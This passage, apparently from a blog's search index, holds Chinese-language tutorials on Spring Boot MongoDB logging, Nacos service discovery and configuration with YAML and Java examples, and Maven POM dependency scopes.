execute(RedisCallback<T> redisCallback) {\n            return redisTemplate.execute(redisCallback);\n        }\n    }\n    ```\n    \n\n\n\n","tags":["SpringBoot","Mongodb"],"categories":["数据库","Spring","Redis","SpringBoot"]},{"title":"SpringBoot集成MongoDB","url":"/20250619/a2ff3ade.html","content":"\n# Spring Boot集成Mongodb在控制台输出nosql的日志\n\n大家只需要在`application.properties`的配置文件下增加以下的配置就可以了\n\n```properties\nlogging.level.org.springframework.data.mongodb.core = DEBUG\n```\n\n\n\n```properties\n###############log4j 4 SQL Output start################# \nlog4j.logger.com.dayainfo.ssp=DEBUG \nlog4j.logger.com.springframework=DEBUG \nlog4j.logger.com.ibatis=DEBUG \nlog4j.logger.com.ibatis.common.jdbc.SimpleDataSource=DEBUG \nlog4j.logger.com.ibatis.common.jdbc.ScriptRunner=DEBUG \nlog4j.logger.com.ibatis.sqlmap.engine.impl.SqlMapClientDelegate=DEBUG \nlog4j.logger.java.sql.Connection=DEBUG \nlog4j.logger.java.sql.Statement=DEBUG \nlog4j.logger.java.sql.PreparedStatement=DEBUG \nlog4j.logger.java.sql.ResultSet=DEBUG \nlog4j.logger.org.apache.ibatis.logging.commons.JakartaCommonsLoggingImpl=DEBUG \nlog4j.logger.java.sql=DEBUG,CONSOLE \nlog4j.appender.CONSOLE = org.apache.\nlog4j.ConsoleAppender \nlog4j.appender.CONSOLE.Target = System.out \nlog4j.appender.CONSOLE.layout = org.apache.\nlog4j.PatternLayout \nlog4j.appender.CONSOLE.layout.ConversionPattern =%d{ABSOLUTE} %5p %c{1}\\:%L - %m%n \n###############log4j 4 SQL Output end###################\n```\n\n","tags":["SpringBoot","Mongodb"],"categories":["数据库","Spring","MongoDB","SpringBoot"]},{"title":"Nacos","url":"/20250619/c383a3c4.html","content":"\nNacos 是一个更易于帮助构建云原生应用的动态服务发现、配置和服务管理平台（参考自 [Nacos 官网](https://nacos.io/zh-cn/index.html)）。\n\n英文全称为 Dynamic Naming and Configuration Service，是一个由阿里巴巴团队使用 Java 语言开发的开源项目。Nacos 的命名是由 3 部分组成：\n\n| 组成部分 | 全称              | 描述                                                         |\n| -------- | ----------------- | ------------------------------------------------------------ |\n| Na       | naming/nameServer | 即服务注册中心，与 Spring Cloud Eureka 的功能类似。          |\n| co       | configuration     | 即配置中心，与 Spring Cloud Config+Spring Cloud Bus 的功能类似。 |\n| s        | service           | 即服务，表示 Nacos 实现的服务注册中心和配置中心都是以服务为核心的。 |\n\n我们可以将 Nacos 理解成服务注册中心和配置中心的组合体。\n\n- 它可以替换 [Eureka](http://c.biancheng.net/springcloud/eureka.html) 作为服务注册中心，实现服务的注册与发现；\n- 可以替换 [Spring Cloud Config](http://c.biancheng.net/springcloud/config.html) 作为配置中心，实现配置的动态刷新。\n\nNacos 支持几乎所有主流类型“服务”的发现、配置和管理：\n\n- [Kubernetes Service](https://kubernetes.io/docs/concepts/services-networking/service/)\n- [gRPC ](https://grpc.io/docs/what-is-grpc/core-concepts#service-definition)& [Dubbo RPC Service](https://dubbo.apache.org/zh/)\n- Spring Cloud RESTful Service\n\n# Nacos 的特性\n\nNacos 提供了一系列简单易用的特性，能够帮助我们快速地实现动态服务发现、服务配置等功能。\n\n## 服务发现\n\nNacos 支持基于 DNS 和 RPC 的服务发现。\n\n当服务提供者使用原生 SDK、OpenAPI 或一个独立的 Agent TODO 向 Nacos 注册服务后，服务消费者可以在 Nacos 上通过 DNS TODO 或 HTTP&API 查找、发现服务。\n\n## 服务健康监测\n\nNacos 提供对服务的实时健康检查，能够阻止请求发送到不健康主机或服务实例上。Nacos 还提供了一个健康检查仪表盘，能够帮助我们根据健康状态管理服务的可用性及流量。\n\n## 动态配置服务\n\n动态配置服务可以让我们以中心化、外部化和动态化的方式，管理所有环境的应用配置和服务配置。\n\n动态配置消除了配置变更时重新部署应用和服务的需要，让配置管理变得更加高效、敏捷。\n\n配置中心化管理让实现无状态服务变得更简单，让服务按需弹性扩展变得更容易。\n\nNacos 提供了一个简洁易用的 UI 帮助我们管理所有服务和应用的配置。Nacos 还提供包括配置版本跟踪、金丝雀发布、一键回滚配置以及客户端配置更新状态跟踪在内的一系列开箱即用的配置管理特性，帮助我们更安全地在生产环境中管理配置变更和降低配置变更带来的风险。\n\n## 动态 DNS 服务\n\nNacos 提供了动态 DNS 服务，能够让我们更容易地实现负载均衡、流量控制以及数据中心内网的简单 DNS 解析服务。\n\nNacos 提供了一些简单的 DNS APIs TODO，可以帮助我们管理服务的关联域名和可用的 IP:PORT 列表。\n\n## 服务及其元数据管理\n\nNacos 能让我们从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略、服务的 SLA 以及 metrics 统计数据。\n\n# Nacos 两大组件\n\n与 Eureka 类似，Nacos 也采用 CS（Client/Server，客户端/服务器）架构，它包含两大组件，如下表。\n\n1. Nacos Server\n\n   描述：\n\n   - Nacos 服务端，与 Eureka Server 不同，Nacos Server 由阿里巴巴团队使用 Java 语言编写并将 Nacos Server 的下载地址给用户，用户只需要直接下载并运行即可。\n\n   功能：\n\n   - Nacos Server 可以作为服务注册中心，帮助 Nacos Client 实现服务的注册与发现。\n   - Nacos Server 可以作为配置中心，帮助 Nacos Client 在不重启的情况下，实现配置的动态刷新。\n\n2. Nacos Client\n\n     描述：\n\n   - Nacos 客户端，通常指的是微服务架构中的各个服务，由用户自己搭建，可以使用多种语言编写。\n\n   功能：\n\n   - Nacos Client 通过添加依赖 spring-cloud-starter-alibaba-nacos-discovery，在服务注册中心（Nacos Server）中实现服务的注册与发现\n\n   - Nacos Client 通过添加依赖 spring-cloud-starter-alibaba-nacos-config，在配置中心（Nacos Server）中实现配置的动态刷新。\n\n# Nacos 服务注册中心\n\nNacos 作为服务注册中心可以实现服务的注册与发现，流程如下图。\n\n\n\n![Nacos 服务注册与发现](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/1022563360-0.png) \n\n\n在图 1 中共涉及到以下 3 个角色：\n\n- 服务注册中心（Register Service）：它是一个 Nacos Server，可以为服务提供者和服务消费者提供服务注册和发现功能。\n- 服务提供者（Provider Service）：它是一个 Nacos Client，用于对外服务。它将自己提供的服务注册到服务注册中心，以供服务消费者发现和调用。\n- 服务消费者（Consumer Service）：它是一个 Nacos Client，用于消费服务。它可以从服务注册中心获取服务列表，调用所需的服务。\n\nNacos 实现服务注册与发现的流程如下：\n\n1. 从 Nacos 官方提供的下载页面中，下载 Nacos Server 并运行。\n2. 服务提供者 Nacos Client 启动时，会把服务以服务名（spring.application.name）的方式注册到服务注册中心（Nacos Server）；\n3. 服务消费者 Nacos Client 启动时，也会将自己的服务注册到服务注册中心；\n4. 服务消费者在注册服务的同时，它还会从服务注册中心获取一份服务注册列表信息，该列表中包含了所有注册到服务注册中心上的服务的信息（包括服务提供者和自身的信息）；\n5. 在获取了服务提供者的信息后，服务消费者通过 HTTP 或消息中间件远程调用服务提供者提供的服务。\n\n\n\n# 默认端口说明\n\n| 端口 | 与主端口的偏移量 | 描述                                                       | 版本 |\n| ---- | ---------------- | ---------------------------------------------------------- | ---- |\n| 8848 | 0                | 主端口                                                     |      |\n| 9848 | 1000             | 客户端gRPC请求服务端端口，用于客户端向服务端发起连接和请求 |      |\n| 9849 | 1001             | 服务端gRPC请求服务端端口，用于服务间同步等                 |      |\n|      |                  |                                                            |      |\n\n\n\n## Common property configuration\n\n| name                                    | description                                                  | option                                                       |\n| --------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| MODE                                    | cluster/standalone                                           | cluster/standalone default **cluster**                       |\n| NACOS_SERVERS                           | nacos cluster address                                        | eg. ip1:port1 ip2:port2 ip3:port3                            |\n| PREFER_HOST_MODE                        | Whether hostname are supported                               | hostname/ip default **ip**                                   |\n| NACOS_APPLICATION_PORT                  | nacos server port                                            | default **8848**                                             |\n| NACOS_SERVER_IP                         | custom nacos server ip when network was mutil-network        |                                                              |\n| SPRING_DATASOURCE_PLATFORM              | standalone support mysql                                     | mysql / empty default empty                                  |\n| MYSQL_SERVICE_HOST                      | mysql host                                                   |                                                              |\n| MYSQL_SERVICE_PORT                      | mysql database port                                          | default : **3306**                                           |\n| MYSQL_SERVICE_DB_NAME                   | mysql database name                                          |                                                              |\n| MYSQL_SERVICE_USER                      | username of database                                         |                                                              |\n| MYSQL_SERVICE_PASSWORD                  | password of database                                         |                                                              |\n| MYSQL_DATABASE_NUM                      | It indicates the number of database                          | default :**1**                                               |\n| MYSQL_SERVICE_DB_PARAM                  | Database url parameter                                       | default : **characterEncoding=utf8&connectTimeout=1000&socketTimeout=3000&autoReconnect=true&useSSL=false** |\n| JVM_XMS                                 | -Xms                                                         | default :1g                                                  |\n| JVM_XMX                                 | -Xmx                                                         | default :1g                                                  |\n| JVM_XMN                                 | -Xmn                                                         | default :512m                                                |\n| JVM_MS                                  | -XX:MetaspaceSize                                            | default :128m                                                |\n| JVM_MMS                                 | -XX:MaxMetaspaceSize                                         | default :320m                                                |\n| NACOS_DEBUG                             | enable remote debug                                          | y/n default :n                                               |\n| TOMCAT_ACCESSLOG_ENABLED                | server.tomcat.accesslog.enabled                              | default :false                                               |\n| NACOS_AUTH_SYSTEM_TYPE                  | The auth system to use, currently only 'nacos' is supported  | default :nacos                                               |\n| NACOS_AUTH_ENABLE                       | If turn on auth system                                       | default :false                                               |\n| NACOS_AUTH_TOKEN_EXPIRE_SECONDS         | The token expiration in seconds                              | default :18000                                               |\n| NACOS_AUTH_TOKEN                        | The default token                                            | default :SecretKey012345678901234567890123456789012345678901234567890123456789 |\n| NACOS_AUTH_CACHE_ENABLE                 | Turn on/off caching of auth information. By turning on this switch, the update of auth information would have a 15 seconds delay. | default : false                                              |\n| MEMBER_LIST                             | Set the cluster list with a configuration file or command-line argument | eg:192.168.16.101:8847?raft_port=8807,192.168.16.101?raft_port=8808,192.168.16.101:8849?raft_port=8809 |\n| EMBEDDED_STORAGE                        | Use embedded storage in cluster mode without mysql           | `embedded` default : none                                    |\n| NACOS_AUTH_CACHE_ENABLE                 | nacos.core.auth.caching.enabled                              | default : false                                              |\n| NACOS_AUTH_USER_AGENT_AUTH_WHITE_ENABLE | nacos.core.auth.enable.userAgentAuthWhite                    | default : false                                              |\n| NACOS_AUTH_IDENTITY_KEY                 | nacos.core.auth.server.identity.key                          | default : serverIdentity                                     |\n| NACOS_AUTH_IDENTITY_VALUE               | nacos.core.auth.server.identity.value                        | default : security                                           |\n| NACOS_SECURITY_IGNORE_URLS              | nacos.security.ignore.urls                                   | default : `/,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-fe/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/**` |\n\n\n\n参考\n\n- http://c.biancheng.net/springcloud/nacos.html\n- https://www.jb51.net/article/235057.htm\n","tags":["Nacos"],"categories":["框架|中间件","Nacos"]},{"title":"Nacos 使用示例","url":"/20250619/60f15e7e.html","content":"\n# 配置中心示例\n\n源码地址：https://github.com/hmxyl/nacosdemo.git\n\n## 准备Nacos配置文件\n\n![image-20230510164730428](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230510164730428.png)\n\n\n\n## 使用 application.yml 配置（推荐）\n\n> 1. 版本号\n>     从 2021.0.1.0 开始，Spring Cloud Alibaba  版本将会对应 Spring Cloud 版本，\n>     前三位为 Spring Cloud 版本，最后一位为扩展版本\n> 2. 弃用 `bootstrap.yml` 文件（Spring Cloud 在Spring boot 2.4以后无法应用BootStrap.yml）\n> 3. 源码： configuration 模块\n\n1. pom.xml\n\n    ```xml\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>com.alibaba.cloud</groupId>\n        <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>\n    </dependency>\n    ```\n\n2. application.yml\n\n    ```yaml\n    server:\n      port: 8801\n    spring:\n      application:\n        name: configuration\n      cloud:\n        nacos:\n          server-addr: native.virtual.com:8848\n          config:\n            server-addr: ${spring.cloud.nacos.server-addr}\n            namespace: learn-${spring.profiles.active}\n      config:\n        import:\n          - optional:nacos:${spring.application.name}.yml?refreshEnabled=true&group=DEFAULT_GROUP\n          - optional:nacos:text.yml?refreshEnabled=true&group=DEFAULT_GROUP\n          - optional:nacos:code.yml?refreshEnabled=true&group=DEFAULT_GROUP\n    ```\n\n3. 启动时 配置 active profiles 为 `dev`\n\n4. 启动 ConfigurationOldApplication\n\n5. 访问 http://localhost:8801/config/info 获取配置信息\n\n    ```java\n    @RestController\n    public class ConfigClientController {\n        @Autowired\n        ConfigInfo configInfo;\n    \n        @GetMapping(\"/config/info\")\n        public String getConfigInfo() {\n            return configInfo.getText() + \":\" + configInfo.getCode();\n        }\n    }\n    ```\n\n6. Junit 单元测试\n\n    ```java\n    import com.local.bean.ConfigInfo;\n    import org.junit.jupiter.api.Test;\n    import org.junit.runner.RunWith;\n    import org.springframework.boot.test.context.SpringBootTest;\n    import org.springframework.test.context.ActiveProfiles;\n    import org.springframework.test.context.TestPropertySource;\n    import org.springframework.test.context.junit4.SpringRunner;\n    \n    import javax.annotation.Resource;\n    \n    @RunWith(SpringRunner.class)\n    @SpringBootTest(classes = ConfigurationOldApplication.class)\n    @ActiveProfiles(\"dev\")\n    @TestPropertySource(\n            properties = {\n                    \"spring.cloud.nacos.config.namespace=learn-dev\"\n            }\n    )\n    class ConfigurationOldApplicationTests {\n        @Resource\n        private ConfigInfo configInfo;\n    \n        @Test\n        void testConfig() {\n            assert \"abc\".equalsIgnoreCase(configInfo.getText());\n            assert \"123\".equalsIgnoreCase(configInfo.getCode());\n            assert \"configuration_test\".equalsIgnoreCase(configInfo.getMessage());\n        }\n    }\n    ```\n\n    \n\n参考[1]：https://github.com/alibaba/spring-cloud-alibaba/blob/2021.x/spring-cloud-alibaba-docs/src/main/asciidoc-zh/sca-upgrade-guide.adoc\n\n参考[2]：https://developer.aliyun.com/article/897341#slide-12\n\n## 使用 bootstrap.yml 配置（不推荐）\n\n>  源码： configuration_old 模块\n\n1. pom.xml\n\n    ```xml\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>com.alibaba.cloud</groupId>\n        <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>\n    </dependency>\n    <!--SpringCloud2020及以后的版本默认不启用 bootstrap 配置，我们需要在pom里面显式地引入：-->\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-bootstrap</artifactId>\n    </dependency>\n    ```\n\n    > 注意：我们使用的 Spring Cloud 2020 版本默认不启用 bootstrap，若想要在应用启动时加载 bootstrap 配置（例如 bootstrap.yml 或 bootstrap.properties），就需要我们在 pom.xml 中显式的引入 spring-cloud-starter-bootstrap 依赖。\n\n2. bootstrap.yml\n\n    ```yaml\n    server:\n      port: 8802\n    spring:\n      application:\n        name: configuration_old\n      cloud:\n        nacos:\n          config:\n            server-addr: native.virtual.com:8848\n            namespace: learn-${spring.profiles.active}\n            group: DEFAULT_GROUP\n            name: configuration.yml\n            file-extension: yml\n            extension-configs[0]:\n              data-id: text.yml\n              refresh: true\n            extension-configs[1]:\n              data-id: code.yml\n              refresh: true\n    ```\n\n    > config配置的dataID组成: \\${prefix}-\\${spring.profiles.active}.\\${file-extension}\n    >\n    > - ${prefix}：默认取值为微服务的服务名，即配置文件中 spring.application.name 的值，我们可以在配置文件中通过配置 `spring.cloud.nacos.config.prefix` 来指定。\n    > - \\${spring.profiles.active}：表示当前环境对应的 Profile，例如 dev、test、prod 等。当没有指定环境的 Profile 时，其对应的连接符也将不存在， dataId 的格式变成\\${prefix}.\\${file-extension}。\n    > - \\${file-extension}：表示配置内容的数据格式，我们可以在配置文件中通过配置项 `spring.cloud.nacos.config.file-extension` 来配置，例如 properties 和 yaml。\n\n    问题记录：\n\n    - **若文件名称不为 bootstrap.yml， 则在启动时，会先加载默认配置。server-addr 为127.0.0.1:8848，而正确的配置，在注解参数读取完成之后，才能读取到。因此BEAN 创建失败**\n\n         `com.alibaba.cloud.nacos.NacosConfigManager`、`com.alibaba.cloud.nacos.NacosConfigProperties`\n\n    ```java\n    org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'scopedTarget.configInfo': Injection of autowired dependencies failed; nested exception is java.lang.IllegalArgumentException: Could not resolve placeholder 'config.text' in value \"${config.text}\"\n    \tat org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:405) ~[spring-beans-5.3.18.jar:5.3.18]\n      ....\n    ```\n\n3. 启动时 配置 active profiles 为 `dev`\n\n4. 启动 ConfigurationOldApplication\n\n5. 访问 http://localhost:8802/config/info 获取配置信息。同上。\n\n6. Junit测试。同上。\n\n\n\n# 注册中心示例\n\n目的：将不同的服务，注册到`服务列表`中，如下图所示\n\n![image-20230510183445711](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230510183445711.png)\n\n| 字段         | 说明                                                         |      |\n| ------------ | ------------------------------------------------------------ | ---- |\n| 服务名       | 注册的服务名称`spring.cloud.nacos.discovery.service` 默认配置的是：`spring.application.name` |      |\n| 触发保护阈值 | 保护阈值：可以设置为0-1之间的浮点数，它其实是⼀个⽐例值（当前服务健康实例数/当前服务总实例数）<br/><br/>⼀般流程下， nacos是服务注册中⼼，服务消费者要从nacos获取某⼀个服务的可⽤实例信息，对于服务实例有健康/不健康状态之分， nacos在返回给消费者实例信息的时候，会返回健康实例。这个时候在⼀些⾼并发、⼤流量场景下会存在⼀定的问题：<br/><br/>如果服务A有100个实例， 98个实例都不健康了，只有2个实例是健康的，如果nacos只返回这两个健康实例的信息的话，那么后续消费者的请求将全部被分配到这两个实例，流量洪峰到来， 2个健康的实例也扛不住了，整个服务A 就扛不住，上游的微服务也会导致崩溃，产⽣雪崩效应。<br/><br/>**保护阈值的意义在于**：当服务A健康实例数/总实例数 < 保护阈值 的时候，说明健康实例真的不多了，这个时候保护阈值会被触发（状态**true**）<br/>nacos将会把该服务所有的实例信息（健康的+不健康的）全部提供给消费者，消费者可能访问到不健康的实例，请求失败，但这样也⽐造成雪崩要好，牺牲了⼀些请求，保证了整个系统的⼀个可⽤ |      |\n|              |                                                              |      |\n\n- 服务注册中心（Register Service）：它是一个 Nacos Server，可以为服务提供者和服务消费者提供服务注册和发现功能。\n- 服务提供者（Provider Service）：它是一个 Nacos Client，用于对外服务。它将自己提供的服务注册到服务注册中心，以供服务消费者发现和调用。\n- 服务消费者（Consumer Service）：它是一个 Nacos Client，用于消费服务。它可以从服务注册中心获取服务列表，调用所需的服务。\n\n\n\n## 注册服务提供者\n\n> producer_a、producer_a 两个模块，模拟两个服务提供者实例\n\n### producer_a \n\n1. pom.xml\n\n    ```\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>com.alibaba.cloud</groupId>\n            <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n        </dependency>\n    </dependencies>\n    ```\n\n2. application.yml\n\n    ```yaml\n    server:\n      port: 8001\n    spring:\n      application:\n        name: producer\n      cloud:\n        nacos:\n          server-addr: native.virtual.com:8848\n          discovery:\n            server-addr: ${spring.cloud.nacos.server-addr}\n            namespace: learn-${spring.profiles.active}\n            service: ${spring.application.name}\n            register-enabled: true\n    ```\n\n    | 配置                                          | 默认                       | 说明         |\n    | --------------------------------------------- | -------------------------- | ------------ |\n    | spring.cloud.nacos.discovery.service          | ${spring.application.name} | 注册服务名称 |\n    | spring.cloud.nacos.discovery.register-enabled | true                       | 是否注册服务 |\n    |                                               |                            |              |\n\n3. 启动类上，使用 `@EnableDiscoveryClient` 注解开启 Nacos 服务发现功能\n\n    ```java\n    @EnableDiscoveryClient\n    @SpringBootApplication\n    public class ProducerA {\n    \tpublic static void main(String[] args) {\n    \t\tSpringApplication.run(ProducerA.class, args);\n    \t}\n    }\n    ```\n\n4. 提供服务的业务方法（测试类）\n\n    ```java\n    @RestController\n    public class DeptController {\n        @Value(\"${server.port}\")\n        private String serverPort;\n        @Value(\"${spring.application.name}\")\n        private String serverName;\n        @GetMapping(value = \"/nacos/{id}\")\n        public String getPayment(@PathVariable(\"id\") Integer id) {\n            return \"服务名：\" + serverName + \"<br /> 端口号： \" + serverPort + \"<br /> 传入的参数：\" + id;\n        }\n    }\n    ```\n\n5. 启动模块, 提示  **register finished** 注册完成。查看Nacos服务列表，此时 producer  服务已注册，实例数为1。\n\n6. 使用浏览器访问http://localhost:8001/nacos/1 验证实例是否正常提供服务\n\n    ![image-20230510181828965](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230510181828965.png) \n\n\n\n### producer_b\n\n1. pom.xml ：同 producer_a\n\n2. application.yml\n\n    ```yaml\n    server:\n      port: 8002\n    spring:\n      application:\n        name: producer\n      cloud:\n        nacos:\n          server-addr: native.virtual.com:8848\n          discovery:\n            server-addr: ${spring.cloud.nacos.server-addr}\n            namespace: learn-${spring.profiles.active}\n            service: ${spring.application.name}\n    ```\n\n3. 启动类上，使用 `@EnableDiscoveryClient` 注解开启 Nacos 服务发现功能\n\n4. 提供服务的业务方法（测试类）\n\n5. 启动模块。查看Nacos服务列表，此时 producer  服务已注册，实例数为2。\n\n6. 使用浏览器访问http://localhost:8002/nacos/1 验证实例是否正常提供服务\n\n    ![image-20230510182034079](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230510182034079.png) \n\n## 注册服务消费者\n\n### consumer\n\n1. pom.xml\n\n    ```xml\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>com.alibaba.cloud</groupId>\n            <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n        </dependency>\n        <!--由于 Netflix Ribbon 进入停更维护阶段，因此新版本的 Nacos discovery 都已经移除了 Ribbon ，此时我们需要引入 loadbalancer 代替 -->\n        <dependency>\n            <groupId>org.springframework.cloud</groupId>\n            <artifactId>spring-cloud-loadbalancer</artifactId>\n        </dependency>\n    </dependencies>\n    ```\n\n2. application.yml\n\n    ```yaml\n    server:\n      port: 8101\n    spring:\n      application:\n        name: consumer\n      cloud:\n        nacos:\n          server-addr: native.virtual.com:8848\n          discovery:\n            server-addr: ${spring.cloud.nacos.server-addr}\n            namespace: learn-${spring.profiles.active}\n            register-enabled: false\n    service-url:\n      nacos-user-service: http://producer\n    ```\n\n3. 创建一个`配置类`，使用 @LoadBalanced 注解与 Ribbon 进行集成开启负载均衡功能\n\n    ```java\n    import org.springframework.cloud.client.loadbalancer.LoadBalanced;\n    import org.springframework.context.annotation.Bean;\n    import org.springframework.context.annotation.Configuration;\n    import org.springframework.web.client.RestTemplate;\n    \n    @Configuration\n    public class ApplicationContextBean {\n        @Bean\n        @LoadBalanced //与 Ribbon 集成，并开启负载均衡功能\n        public RestTemplate getRestTemplate() {\n            return new RestTemplate();\n        }\n    }\n    ```\n\n4. 创建消费者测试类\n\n    ```java\n    @RestController\n    public class ConsumerController {\n        @Resource\n        private RestTemplate restTemplate;\n    \n        @Value(\"${service-url.nacos-user-service}\")\n        private String serverURL; //服务提供者的服务名\n    \n        @GetMapping(\"/consumer/nacos/{id}\")\n        public String paymentInfo(@PathVariable(\"id\") Long id) {\n            return restTemplate.getForObject(serverURL + \"/nacos/\" + id, String.class);\n        }\n    }\n    ```\n\n5. 启动consumer模块\n\n6. 使用浏览器多次访问 `http://localhost:8101/consumer/nacos/1`。\n\n    浏览器地址不变，4次请求结果如下\n\n    | 请求次数 | 返回结果                                             |\n    | -------- | ---------------------------------------------------- |\n    | 1        | 服务名：producer<br/>端口号： 8001<br/>传入的参数：1 |\n    | 2        | 服务名：producer<br/>端口号： 8002<br/>传入的参数：1 |\n    | 3        | 服务名：producer<br/>端口号： 8001<br/>传入的参数：1 |\n    | 4        | 服务名：producer<br/>端口号： 8002<br/>传入的参数：1 |\n\n##  问题记录\n\n1. nacos服务部署时， 配置的默认路径由  `server.servlet.contextPath=/nacos` 修改为  `server.servlet.contextPath=/`  API 查询结果404\n\n\n\n  \n\n\n\n","tags":["Nacos"],"categories":["框架|中间件","Nacos"]},{"title":"POM.XML文件说明","url":"/20250619/9926a393.html","content":"\n\n\n# POM文件结构\n\n## 父模块信息：parent\n\n```xml\n<parent>\n    <groupId>com.local</groupId>\n    <artifactId>learn</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    <relativePath/>\n</parent>\n```\n\n1. relativePath：父模块pom.xml文件的相对路径。默认`../pom.xml`。Maven首先在文件系统上的这个位置查找父POM，然后在本地存储库中查找，最后在远程repo中查找。\n\n## 项目信息\n\n\n\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\">\n  <modelVersion>4.0.0</modelVersion> \n  <groupId>com.local</groupId>\n  <artifactId>learn</artifactId>\n  <version>0.0.1-SNAPSHOT</version>\n  <name>learn</name>\n  <description>learn</description>\n  <packaging>pom</packaging>\n    ...\n</project>\n```\n\n1. project：是所有pom.xml的根元素，并且在里面定义了命名空间和xsd元素；\n2. modelVersion：当前pom模型的版本；\n3. groupId：定义当前maven项目隶属的实际项目，并会根据这给项目建立包结构；\n4. artifactId：定义项目中的某个模块名称（parent中），如果只有一个模块那就是项目的名称；\n5. version：定义maven项目当前所处的版本号，默认0.0.1-SNAPSHOT为快照版本；\n6. packaging：定义maven项目的打包方式，可以是jar包、war包、pom；\n7. name：项目名称\n\n## 依赖信息：dependency\n\n1. dependencyManagement：（父模块中使用）继承此依赖项的项目的默认依赖项信息。此部分中的依赖项不会立即解析。相反，当从这个父POM派生的子POM声明了一个由匹配的groupId和artifactId描述的依赖项时，如果这个部分的版本和其他值尚未指定，则将用于该依赖项\n\n   \n\n2. dependencies：依赖包配置列表 包含多个dependency配置\n\n   ```xml\n   <dependencies>\n     <dependency>                          \n      ...                     \n     </dependency>  \n     <dependency>                          \n      ...                     \n     </dependency>  \n   </dependencies>\n   ```\n\n3. dependency :  依赖包信息\n\n   ```xml\n   <dependency>                          \n       <groupId>实际项目</groupId>           \n       <artifactId>模块</artifactId>       \n       <version>版本</version>             \n       <type>依赖类型</type>                 \n       <scope>依赖范围：默认是compile。可选项：compile、provided、runtime、test、system</scope>  \n       <optional>依赖是否传递,默认值为false。此jar包不会在其他项目中被引用加载、不参与maven的依赖传递</optional>       \n       <!-- 排除传递性依赖 -->              \n       <exclusions>                      \n           <exclusion>                   \n               <groupId>…</groupId>      \n               <artifactId>…</artifactId>\n           </exclusion>                  \n       </exclusions>                     \n   </dependency>  \n   ```\n\n## 依赖范围： dependency.scope 详细说明\n\n> scope 依赖传递:\n>\n> A -> B -> C, 当前项目 A，A依赖于B，B依赖于C，知道B在 A中的scope，怎么知道 C在 A 中的 scope\n>\n> 即，A需不需要 C的问题，本质由 C在B中的scope决定\n>\n> 当 C 在 B 中的scope 是test 或 provided 时，C 直接被丢弃，A不依赖C\n>\n> 否则 A 依赖 C，C的scope 继承与B 的scope\n\n| scope     | 范围                                        | 说明                                                         |\n| --------- | ------------------------------------------- | ------------------------------------------------------------ |\n| `compile` | compile<br />runtime<br />test<br />package | 默认配置。运行期有效，需要打入包中。该依赖需要参与当前项目的编译、测试、运行、打包 |\n| provided  | compile<br />test                           | 只存在编译、测试、阶段，不会打入包中<br />表明该依赖已经提供，故只在未提供时才被使用 |\n| runtime   | runtime<br />test<br />package              | 编译不需要，在运行期有效，需要导入包中。（接口与实现分离）<br />比如，你可能在编译的时候只需要JDBC API JAR，而只有在运行的时候才需要JDBC驱动实现。 |\n| test      | test                                        | 测试需要，不会打入包中                                       |\n| system    | compile<br />test                           | 和`provided`类似，在编译、测试时有效，但是在运行时无效。<br />和`provided`的区别：使用system范围的依赖时必须通过systemPath元素显式地指定依赖文件的路径。<br />由于此类依赖不是通过Maven仓库解析的，而且往往与本机系统绑定，可能造成构建的不可移植，因此应该谨慎使用。 |\n\n- provided\n\n  应用场景：你定义了一个servlet，此刻得需要  `servlet-api.jar` 才能编译成功，但是当你达成 `war` 包时，你并不想将 `servlet-api.jar` 包进去，因为`Tomcat`等容器会提供，所以当启动Tomcat的时候，就不会冲突了\n\n  ```xml\n  <dependency>\n      <groupId>javax.servlet</groupId>\n      <artifactId>servlet-api</artifactId>\n      <version>3.0-alpha-1</version>   \n      <scope>provided</scope>\n  </dependency> \n  ```\n\n- system\n\n  从参与度来说，和provided相同，不过被依赖项不会从maven仓库下载，而是从本地文件系统拿。需要添加systemPath的属性来定义路径。\n\n  ```xml\n  <dependency>\n    <!--自定义-->\n    <groupId>com.im</groupId> \n    <!--自定义-->\n    <artifactId>sdk</artifactId>  \n    <!--自定义-->\n    <version>1.0</version>\n    <!--system，类似provided，需要显式提供依赖的jar以后，Maven就不会在Repository中查找它-->\n    <scope>system</scope>\n    <!--项目根目录下的lib文件夹下-->\n    <systemPath>${basedir}/lib/sdk-1.0.jar</systemPath>\n  </dependency>\n  ```\n\n\n\n# Maven预定义内置属性\n\n```xml\n${basedir} 表示项目根目录,即包含pom.xml文件的目录;\n${version} 表示项目版本;\n${project.basedir} 同${basedir};\n${project.baseUri} 表示项目文件地址;\n${maven.build.timestamp} 